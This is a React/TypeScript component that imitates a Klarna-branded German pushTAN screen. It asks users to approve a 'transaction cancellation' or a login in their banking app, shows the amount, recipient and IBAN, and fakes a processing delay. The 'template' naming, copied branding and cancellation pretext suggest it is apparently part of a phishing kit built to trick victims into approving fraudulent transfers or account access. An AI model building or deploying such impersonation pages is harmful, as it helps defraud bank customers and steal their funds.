import React, { useState, useEffect } from 'react';
import Loading from './Loading';

interface TransactionDetails {
  amount?: string;
  recipient?: string;
  reference?: string;
  iban?: string;
}

type TANType = 'TRANSACTION_TAN' | 'LOGIN_TAN';

interface PushTANScreenProps {
  tanType: TANType;
  transactionDetails?: TransactionDetails;
  onConfirm: () => void;
  onCancel?: () => void;
}

const PushTANScreen: React.FC<PushTANScreenProps> = ({ 
  tanType,
  transactionDetails = {}, 
  onConfirm, 
  onCancel
}) => {
  const [isWaiting, setIsWaiting] = useState(true);
  const [countdown, setCountdown] = useState(120);
  const [isLoading, setIsLoading] = useState(false);
  const [isMobile, setIsMobile] = useState(false);

  useEffect(() => {
    const checkScreenSize = () => {
      setIsMobile(window.innerWidth <= 768);
    };
    checkScreenSize();
    window.addEventListener('resize', checkScreenSize);
    return () => window.removeEventListener('resize', checkScreenSize);
  }, []);

  useEffect(() => {
    const timer = setInterval(() => {
      setCountdown(prev => {
        if (prev <= 1) {
          clearInterval(timer);
          setIsWaiting(false);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);

    return () => clearInterval(timer);
  }, []);

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins}:${secs.toString().padStart(2, '0')}`;
  };

  const handleConfirm = async () => {
    setIsLoading(true);
    await new Promise(resolve => setTimeout(resolve, 1500));
    setIsLoading(false);
    onConfirm();
  };

  if (isLoading) {
    return (
      <Loading 
        message={tanType === 'TRANSACTION_TAN' ? 'Stornierung wird verarbeitet...' : 'pushTAN wird verarbeitet...'}
        type="processing"
      />
    );
  }

  return (
    <div className="klarna-template" style={{
      minHeight: '100vh',
      backgroundColor: '#FAFAFA',
      fontFamily: 'Klarna Text, -apple-system, BlinkMacSystemFont, Segoe UI, system-ui, sans-serif',
      color: '#0A0B09'
    }}>
      <div style={{
        maxWidth: '600px',
        margin: '0 auto',
        padding: isMobile ? '24px' : '48px 24px',
        display: 'flex',
        flexDirection: 'column',
        alignItems: 'center',
        minHeight: '100vh',
        justifyContent: 'center'
      }}>
        
        {/* Main TAN Card */}
        <div style={{
          width: '100%',
          backgroundColor: '#FFFFFF',
          borderRadius: '12px',
          boxShadow: '0 2px 8px rgba(0, 0, 0, 0.08)',
          overflow: 'hidden',
          border: '1px solid #E8E8E8'
        }}>
          
          {/* Pink Header Bar - Klarna's signature */}
          <div style={{
            backgroundColor: '#FFB3C7',
            padding: '32px',
            textAlign: 'center'
          }}>
            <h1 style={{
              color: '#0A0B09',
              fontSize: isMobile ? '1.5rem' : '2rem',
              fontWeight: '700',
              margin: '0',
              fontFamily: 'Klarna Title, -apple-system, BlinkMacSystemFont, Segoe UI, system-ui, sans-serif',
              lineHeight: '1.25'
            }}>
              {tanType === 'TRANSACTION_TAN' ? 'pushTAN Stornierung' : 'pushTAN Anmeldung'}
            </h1>
          </div>

          {/* Main Content */}
          <div style={{
            padding: isMobile ? '24px' : '32px'
          }}>
            
            {/* Instruction Box */}
            <div style={{
              backgroundColor: '#FFE5ED',
              border: '1px solid #FFB3C7',
              borderRadius: '8px',
              padding: '24px',
              marginBottom: '32px',
              textAlign: 'center'
            }}>
              <p style={{
                margin: '0',
                fontSize: isMobile ? '14px' : '16px',
                color: '#0A0B09',
                fontFamily: 'Klarna Text, -apple-system, BlinkMacSystemFont, Segoe UI, system-ui, sans-serif',
                lineHeight: '1.5'
              }}>
                {tanType === 'TRANSACTION_TAN' 
                  ? 'Bestätigen Sie die Stornierung der Transaktion in Ihrer Klarna Banking-App.'
                  : 'Bestätigen Sie Ihren Anmeldeversuch in Ihrer Klarna Banking-App.'
                }
              </p>
            </div>

            {/* Transaction Details Card - only for TRANSACTION_TAN */}
            {tanType === 'TRANSACTION_TAN' && transactionDetails.amount && (
              <div style={{
                backgroundColor: '#F8F8F8',
                border: '2px solid #FFB3C7',
                borderRadius: '12px',
                padding: '24px',
                marginBottom: '32px'
              }}>
                <h2 style={{
                  color: '#FFB3C7',
                  fontSize: isMobile ? '1.25rem' : '1.5rem',
                  fontWeight: '700',
                  margin: '0 0 24px 0',
                  fontFamily: 'Klarna Title, -apple-system, BlinkMacSystemFont, Segoe UI, system-ui, sans-serif',
                  textAlign: 'center',
                  lineHeight: '1.25'
                }}>
                  Zu stornierende Transaktion
                </h2>
                
                <div style={{ display: 'flex', flexDirection: 'column', gap: '16px' }}>
                  <div style={{ 
                    display: 'flex', 
                    justifyContent: 'space-between', 
                    alignItems: 'center',
                    paddingBottom: '12px',
                    borderBottom: '1px solid #E8E8E8'
                  }}>
                    <span style={{
                      color: '#6E6E6E',
                      fontSize: '14px',
                      fontFamily: 'Klarna Text, -apple-system, BlinkMacSystemFont, Segoe UI, system-ui, sans-serif'
                    }}>Betrag:</span>
                    <span style={{
                      color: '#FFB3C7',
                      fontSize: '18px',
                      fontFamily: 'Klarna Title, -apple-system, BlinkMacSystemFont, Segoe UI, system-ui, sans-serif',
                      fontWeight: '700'
                    }}>{transactionDetails.amount}</span>
                  </div>
                  
                  {transactionDetails.recipient && (
                    <div style={{ 
                      display: 'flex', 
                      justifyContent: 'space-between', 
                      alignItems: 'center',
                      paddingBottom: '12px',
                      borderBottom: '1px solid #E8E8E8'
                    }}>
                      <span style={{
                        color: '#6E6E6E',
                        fontSize: '14px',
                        fontFamily: 'Klarna Text, -apple-system, BlinkMacSystemFont, Segoe UI, system-ui, sans-serif'
                      }}>Empfänger:</span>
                      <span style={{
                        color: '#0A0B09',
                        fontSize: '14px',
                        fontFamily: 'Klarna Text, -apple-system, BlinkMacSystemFont, Segoe UI, system-ui, sans-serif',
                        textAlign: 'right',
                        maxWidth: '60%'
                      }}>{transactionDetails.recipient}</span>
                    </div>
                  )}
                  
                  {transactionDetails.iban && (
                    <div style={{ 
                      display: 'flex', 
                      justifyContent: 'space-between', 
                      alignItems: 'center',
                      paddingBottom: '12px',
                      borderBottom: '1px solid #E8E8E8'
                    }}>
                      <span style={{
                        color: '#6E6E6E',
                        fontSize: '14px',
                        fontFamily: 'Klarna Text, -apple-system, BlinkMacSystemFont, Segoe UI, system-ui, sans-serif'
                      }}>IBAN:</span>
                      <span style={{
                        color: '#0A0B09',
                        fontSize: '14px',
                        fontFamily: 'monospace',
                        textAlign: 'right'
                      }}>{transactionDetails.iban}</span>
                    </div>
                  )}
                  
                  {transactionDetails.reference && (
                    <div style={{ 
                      display: 'flex', 
                      justifyContent: 'space-between', 
                      alignItems: 'center'
                    }}>
                      <span style={{
                        color: '#6E6E6E',
                        fontSize: '14px',
                        fontFamily: 'Klarna Text, -apple-system, BlinkMacSystemFont, Segoe UI, system-ui, sans-serif'
                      }}>Verwendungszweck:</span>
                      <span style={{
                        color: '#0A0B09',
                        fontSize: '14px',
                        fontFamily: 'Klarna Text, -apple-system, BlinkMacSystemFont, Segoe UI, system-ui, sans-serif',
                        textAlign: 'right',
                        maxWidth: '60%'
                      }}>{transactionDetails.reference}</span>
                    </div>
                  )}
                </div>
              </div>
            )}

            {/* Action Buttons */}
            <div style={{
              display: 'flex',
              flexDirection: isMobile ? 'column' : 'row',
              justifyContent: 'center',
              alignItems: 'center',
              gap: '16px',
              marginBottom: '16px'
            }}>
              <button
                onClick={handleConfirm}
                disabled={isLoading}
                style={{
                  backgroundColor: isLoading ? '#D3D3D3' : '#0A0B09',
                  color: '#FFFFFF',
                  border: 'none',
                  borderRadius: '9999px',
                  padding: '16px 32px',
                  fontSize: '16px',
                  fontFamily: 'Klarna Text, -apple-system, BlinkMacSystemFont, Segoe UI, system-ui, sans-serif',
                  fontWeight: '500',
                  cursor: isLoading ? 'not-allowed' : 'pointer',
                  transition: 'all 150ms cubic-bezier(0.4, 0, 0.2, 1)',
                  width: isMobile ? '100%' : 'auto',
                  minWidth: '180px'
                }}
                onMouseEnter={(e) => {
                  if (!isLoading) {
                    (e.target as HTMLButtonElement).style.backgroundColor = '#2E2E2E';
                    (e.target as HTMLButtonElement).style.transform = 'translateY(-1px)';
                  }
                }}
                onMouseLeave={(e) => {
                  if (!isLoading) {
                    (e.target as HTMLButtonElement).style.backgroundColor = '#0A0B09';
                    (e.target as HTMLButtonElement).style.transform = 'translateY(0)';
                  }
                }}
              >
                {isWaiting 
                  ? (tanType === 'TRANSACTION_TAN' ? 'Manuell stornieren' : 'Manuell bestätigen')
                  : 'Weiter'
                }
              </button>
              
              {onCancel && (
                <button
                  onClick={onCancel}
                  style={{
                    backgroundColor: 'transparent',
                    color: '#FFB3C7',
                    border: '2px solid #FFB3C7',
                    borderRadius: '9999px',
                    padding: '14px 30px',
                    fontSize: '16px',
                    fontFamily: 'Klarna Text, -apple-system, BlinkMacSystemFont, Segoe UI, system-ui, sans-serif',
                    fontWeight: '500',
                    cursor: 'pointer',
                    transition: 'all 150ms cubic-bezier(0.4, 0, 0.2, 1)',
                    width: isMobile ? '100%' : 'auto',
                    minWidth: '180px'
                  }}
                  onMouseEnter={(e) => {
                    (e.target as HTMLButtonElement).style.backgroundColor = '#FFB3C7';
                    (e.target as HTMLButtonElement).style.color = '#0A0B09';
                    (e.target as HTMLButtonElement).style.transform = 'translateY(-1px)';
                  }}
                  onMouseLeave={(e) => {
                    (e.target as HTMLButtonElement).style.backgroundColor = 'transparent';
                    (e.target as HTMLButtonElement).style.color = '#FFB3C7';
                    (e.target as HTMLButtonElement).style.transform = 'translateY(0)';
                  }}
                >
                  {tanType === 'TRANSACTION_TAN' ? 'Stornierung abbrechen' : 'Anmeldung abbrechen'}
                </button>
              )}
            </div>

            {/* Footer Info */}
            <div style={{ textAlign: 'center' }}>
              <p style={{
                color: '#6E6E6E',
                fontSize: '12px',
                margin: '0',
                fontFamily: 'Klarna Text, -apple-system, BlinkMacSystemFont, Segoe UI, system-ui, sans-serif',
                lineHeight: '1.5'
              }}>
                Probleme mit der App? Kontaktieren Sie den Klarna Kundenservice.
              </p>
            </div>
          </div>
        </div>
      </div>

      <style jsx>{`
        @keyframes spin {
          0% { transform: rotate(0deg); }
          100% { transform: rotate(360deg); }
        }
      `}</style>
    </div>
  );
};

export { PushTANScreen };
